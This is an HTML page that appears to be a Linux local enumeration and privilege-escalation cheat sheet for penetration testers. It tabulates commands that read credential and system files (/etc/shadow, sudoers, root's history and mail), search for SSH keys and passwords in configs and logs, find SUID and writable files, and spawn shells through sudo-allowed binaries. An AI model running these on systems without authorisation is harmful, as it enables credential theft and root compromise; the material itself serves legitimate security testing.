<div class="entry-content">
						<!-- AddThis Sharing Buttons above -->



<p><b>Kernel, Operating System &amp; Device Information:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>uname -a</code></td>
<td width="54%">Print all available system information</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>uname -r</code></td>
<td width="54%">Kernel release</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>uname -n</code></td>
<td width="54%">System hostname</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>hostname</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>uname -m</code></td>
<td width="54%">Linux kernel architecture (32 or 64 bit)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /proc/version</code></td>
<td width="54%">Kernel information</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/*-release</code></td>
<td width="54%">Distribution information</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/issue</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /proc/cpuinfo</code></td>
<td width="54%">CPU information</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>df -a</code></td>
<td width="54%">File system information</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>Users &amp; Groups:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/passwd</code></td>
<td width="54%">List all users on the system</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/group</code></td>
<td width="54%">List all groups on the system</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>for i in $(cat /etc/passwd 2&gt;/dev/null| cut -d":" -f1 2&gt;/dev/null);do id $i;done 2&gt;/dev/null</code></td>
<td width="54%">List all uid’s and respective group memberships</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/shadow</code></td>
<td width="54%">Privileged command</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'</code></td>
<td width="54%">List all super user accounts</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>finger</code></td>
<td width="54%">Users currently logged in</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>pinky</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>users</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>who -a</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>w</code></td>
<td width="54%">Who is currently logged in and what they’re doing</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>last</code></td>
<td width="54%">Listing of last logged on users</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>lastlog</code></td>
<td width="54%">Information on when all users last logged in</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>lastlog –u %username%</code></td>
<td width="54%">Information on when the specified user last logged in</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>lastlog |grep -v "Never"</code></td>
<td width="54%">Entire list of previously logged on users</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p></p>
<p><b>User &amp; Privilege Information:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>whoami</code></td>
<td width="54%">Current username</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>id</code></td>
<td width="54%">Current user information</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/sudoers</code></td>
<td width="54%">Privileged command</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>sudo -l</code></td>
<td width="54%">Can the current user perform anything as root</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>sudo -l 2&gt;/dev/null | grep -w 'nmap|perl|'awk'|'find'|'bash'|'sh'|'man'<br>|'more'|'less'|'vi'|'vim'|'nc'|'netcat'|python<br>|ruby|lua|irb' | xargs -r ls -la 2&gt;/dev/null</code></td>
<td width="54%">Can the current user run any ‘interesting’ binaries as root and if so also display the binary permissions etc.</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>Environmental Information:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>env</code></td>
<td width="54%">Display environmental variables</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>set</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>echo $PATH</code></td>
<td width="54%">Path information</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>history</code></td>
<td width="54%">Displays command history of current user</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>pwd</code></td>
<td width="54%">Print working directory, i.e. ‘where am I’</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>cat /etc/profile</code></td>
<td width="54%">Display default system variables</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>cat /etc/shells</code></td>
<td width="54%">Display available shells</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>Interesting Files:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / -perm -4000 -type f 2&gt;/dev/null</code></td>
<td width="54%">Find SUID files</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</code></td>
<td width="54%">Find SUID files owned by root</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / -perm -2000 -type f 2&gt;/dev/null</code></td>
<td width="54%">Find GUID files</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / -perm -2 -type f 2&gt;/dev/null</code></td>
<td width="54%">Find world-writeable files</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / ! -path "*/proc/*" -perm -2 -type f -print 2&gt;/dev/null</code></td>
<td width="54%">Find world-writeable files excluding those in /proc</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / -perm -2 -type d 2&gt;/dev/null</code></td>
<td width="54%">Find word-writeable directories </td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find /home –name *.rhosts -print 2&gt;/dev/null</code></td>
<td width="54%">Find rhost config files</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find /home -iname *.plan -exec ls -la {} ; -exec cat {} 2&gt;/dev/null ;</code></td>
<td width="54%">Find *.plan files, list permissions and cat the file contents</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find /etc -iname hosts.equiv -exec ls -la {} 2&gt;/dev/null ; -exec cat {} 2&gt;/dev/null ;</code></td>
<td width="54%">Find hosts.equiv, list permissions and cat the file contents</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ls -ahlR /root/</code></td>
<td width="54%">See if you can access other user directories to find interesting files</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat ~/.bash_history</code></td>
<td width="54%">Show the current users’ command history</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ls -la ~/.*_history</code></td>
<td width="54%">Show the current users’ various history files</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ls -la /root/.*_history</code></td>
<td width="54%">Can we read root’s history files</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ls -la ~/.ssh/</code></td>
<td width="54%">Check for interesting ssh files in the current users’ directory</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2&gt;/dev/null |xargs -r ls -la</code></td>
<td width="54%">Find SSH keys/host information</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ls -la /usr/sbin/in.*</code></td>
<td width="54%">Check Configuration of inetd services</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>grep -l -i pass /var/log/*.log 2&gt;/dev/null</code></td>
<td width="54%">Check log files for keywords (‘pass’ in this example) and show positive matches</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find /var/log -type f -exec ls -la {} ; 2&gt;/dev/null</code></td>
<td width="54%">List files in specified directory (/var/log)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find /var/log -name *.log -type f -exec ls -la {} ; 2&gt;/dev/null</code></td>
<td width="54%">List .log files in specified directory (/var/log)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2&gt;/dev/null</code></td>
<td width="54%">List .conf files in /etc (recursive 1 level)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ls -la /etc/*.conf</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="24"><code>find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2&gt;/dev/null</code></td>
<td width="54%">Find .conf files (recursive 4 levels) and output line number where the word ‘password’ is located</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>lsof -i -n</code></td>
<td width="54%">List open files (output will depend on account privileges)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>head /var/mail/root</code></td>
<td width="54%">Can we read roots mail</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>Service Information:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ps aux | grep root</code></td>
<td width="54%">View services running as root</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ps aux | awk '{print $11}'|xargs -r ls -la 2&gt;/dev/null |awk '!x[$0]++'</code></td>
<td width="54%">Lookup process binary path and permissions</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/inetd.conf</code></td>
<td width="54%">List services managed by inetd</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>cat /etc/xinetd.conf</code></td>
<td width="54%">As above for xinetd</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>cat /etc/xinetd.conf 2&gt;/dev/null | awk '{print $7}' |xargs -r ls -la 2&gt;/dev/null</code></td>
<td width="54%">A very ‘rough’ command to extract associated binaries from xinetd.conf and show permissions of each</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>ls -la /etc/exports 2&gt;/dev/null; cat /etc/exports 2&gt;/dev/null</code></td>
<td width="54%">Permissions and contents of /etc/exports (NFS)</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>Jobs/Tasks:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>crontab -l -u %username%</code></td>
<td width="54%">Privileged command</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ls -la /etc/cron*</code></td>
<td width="54%">Scheduled jobs overview (hourly, daily, monthly etc)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2&gt;/dev/null</code></td>
<td width="54%">What can ‘others’ write in /etc/cron* directories</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>top</code></td>
<td width="54%">List of current tasks</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>Networking, Routing &amp; Communications:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>/sbin/ifconfig -a</code></td>
<td width="54%">List all network interfaces</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/network/interfaces</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>arp -a</code></td>
<td width="54%">Display ARP communications</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>route</code></td>
<td width="54%">Display route information</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>cat /etc/resolv.conf</code></td>
<td width="54%">Show configured DNS sever addresses</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>netstat -antp</code></td>
<td width="54%">Privileged command)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>netstat -anup</code></td>
<td width="54%">Privileged command)</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>iptables -L</code></td>
<td width="54%">Privileged command</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>cat /etc/services</code></td>
<td width="54%">View port numbers/services mappings</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>Programs Installed:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Result</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>dpkg -l</code></td>
<td width="54%">Installed packages (Debian)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>rpm -qa</code></td>
<td width="54%">Installed packages (Red Hat)</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>sudo -V</code></td>
<td width="54%">Sudo version – does an exploit exist?</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>httpd -v</code></td>
<td width="54%">Apache version</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>apache2 -v</code></td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>apache2ctl (or apachectl) -M</code></td>
<td width="54%">List loaded Apache modules</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>mysql --version</code></td>
<td width="54%">Installed MYSQL version details</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>psql -V</code></td>
<td width="54%">Installed Postgres version details</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>perl -v</code></td>
<td width="54%">Installed Perl version details</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>java -version</code></td>
<td width="54%">Installed Java version details</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>python --version</code></td>
<td width="54%">Installed Python version details</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>ruby -v</code></td>
<td width="54%">Installed Ruby version details</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / -name %program_name% 2&gt;/dev/null</code>&nbsp;(i.e. nc, netcat, wget, nmap etc)</td>
<td width="54%">Locate ‘useful’ programs (netcat, wget etc)</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>which %program_name%</code> (i.e. nc, netcat, wget, nmap etc)</td>
<td width="54%">As above</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>dpkg --list 2&gt;/dev/null| grep compiler |grep -v decompiler 2&gt;/dev/null &amp;&amp; yum list installed 'gcc*' 2&gt;/dev/null| grep gcc 2&gt;/dev/null</code></td>
<td width="54%">List available compilers</td>
</tr>
<tr valign="TOP">
<td width="46%"><p></p>
</td><td width="54%">Which account is Apache running as</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><b>Common Shell Escape Sequences:</b></p>
<table border="1" width="100%" cellspacing="0" cellpadding="10">

<tbody>
<tr valign="TOP">
<td width="46%"><b>Command</b></td>
<td width="54%"><b>Program(s)</b></td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>:!bash</code></td>
<td width="54%">vi, vim</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>:shell</code></td>
<td width="54%">vi, vim</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>!bash</code></td>
<td width="54%">less</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; </code></td>
<td width="54%">find</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>awk 'BEGIN {system("/bin/bash")}'</code></td>
<td width="54%">awk</td>
</tr>
<tr valign="TOP">
<td width="46%" height="1"><code>--interactive</code></td>
<td width="54%">nmap</td>
</tr>
<tr valign="TOP">
<td width="46%"><code>perl -e 'exec "/bin/bash";'</code></td>
<td width="54%">Perl</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>A special thanks to the following useful resources:</p>
<ul>
<li><a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html" target="_blank">g0tm1lk</a></li>
<li><a href="http://pen-testing.sans.org/resources/downloads" target="_blank">SANS&nbsp;Pentesting Resources</a></li>
</ul>
<p>&nbsp;</p>

<div class="twitter-share"><iframe id="twitter-widget-2" scrolling="no" frameborder="0" allowtransparency="true" class="twitter-share-button twitter-share-button-rendered twitter-tweet-button" title="Twitter Tweet Button" src="https://platform.twitter.com/widgets/tweet_button.39f7ee9fffbd122b7a37a520dbdaebc6.en-gb.html#dnt=false&amp;id=twitter-widget-2&amp;lang=en-gb&amp;original_referer=https%3A%2F%2Fwww.rebootuser.com%2F%3Fp%3D1623&amp;size=m&amp;text=%40Rebootuser%20%7C%20Local%20Linux%20Enumeration%20%26%20Privilege%20Escalation%20Cheatsheet&amp;time=1477356875751&amp;type=share&amp;url=https%3A%2F%2Fwww.rebootuser.com%2F%3Fp%3D1623&amp;via=rebootuser" style="position: static; visibility: visible; width: 61px; height: 20px;" data-url="https://www.rebootuser.com/?p=1623"></iframe></div>
<!-- AddThis Sharing Buttons below -->					</div>
